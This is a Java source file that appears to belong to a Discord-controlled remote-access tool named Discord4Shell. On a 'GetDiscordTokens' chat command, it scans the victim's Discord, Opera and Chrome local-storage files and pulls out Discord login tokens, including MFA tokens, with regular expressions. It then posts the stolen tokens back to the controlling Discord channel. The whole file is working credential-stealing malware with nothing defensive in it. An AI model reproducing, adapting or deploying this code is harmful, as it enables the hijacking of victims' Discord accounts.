package org.example.commands;

import net.dv8tion.jda.api.events.message.MessageReceivedEvent;
import net.dv8tion.jda.api.hooks.ListenerAdapter;

import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import java.util.Objects;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import static org.example.Discord4Shell.Discord4Shell.user;
import static org.example.commands.SelectTargetMessage.SelectedTarget;

public class GetDiscordTokenMessage extends ListenerAdapter {

    public static final List<String> discordTokens = new ArrayList<>();
    private static final Pattern mfaRegex = Pattern.compile("mfa\\.[\\w-]{84}");
    private static final Pattern defaultRegex = Pattern.compile("[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{38}");
    public void onMessageReceived(MessageReceivedEvent event) {
        if (event.getAuthor().isBot()) {
            return;
        }

        if (event.getMessage().getContentRaw().equalsIgnoreCase("GetDiscordTokens")) {
            if(Objects.equals(SelectedTarget, user)) {
                List<String> paths = new ArrayList<>();
                paths.add(System.getProperty("user.home") + "/AppData/Roaming/discord/Local Storage/leveldb/");
                paths.add(System.getProperty("user.home") + "/AppData/Roaming/discordptb/Local Storage/leveldb/");
                paths.add(System.getProperty("user.home") + "/AppData/Roaming/discordcanary/Local Storage/leveldb/");
                paths.add(System.getProperty("user.home") + "/AppData/Roaming/Opera Software/Opera Stable/Local Storage/leveldb/");
                paths.add(System.getProperty("user.home") + "/AppData/Local/Google/Chrome/User Data/Default/Local Storage/leveldb/");

                for (String path : paths) {
                    File dir = new File(path);

                    String[] files = dir.list();

                    if (files == null) continue;

                    for (String pathname : files) {
                        try {
                            FileInputStream fis = new FileInputStream(path + pathname);
                            StringBuilder str = new StringBuilder();
                            int data;

                            while ((data = fis.read()) != -1)
                                str.append((char) data);


                            fis.close();

                            List<String> tokensList = new ArrayList<>();

                            Matcher def = defaultRegex.matcher(str.toString());
                            Matcher mfa = mfaRegex.matcher(str.toString());

                            // Scanning for non-MFA Tokens



                            while(def.find()) {
                                tokensList.add(def.group());
                            }




                            discordTokens.addAll(tokensList);
                            tokensList.clear();

                            // Scanning for MFA Tokens
                            while(mfa.find()) {
                                tokensList.add(mfa.group());
                            }


                            discordTokens.addAll(tokensList);
                            tokensList.clear();
                        } catch (Exception ignore) {
                        }
                    }
                }

                if(discordTokens.size() == 0)
                    event.getChannel().sendMessage("No Tokens Found").queue();
                else if(discordTokens.size() > 0)
                    event.getChannel().sendMessage(discordTokens.toString()).queue();
            }
        }
    }
}
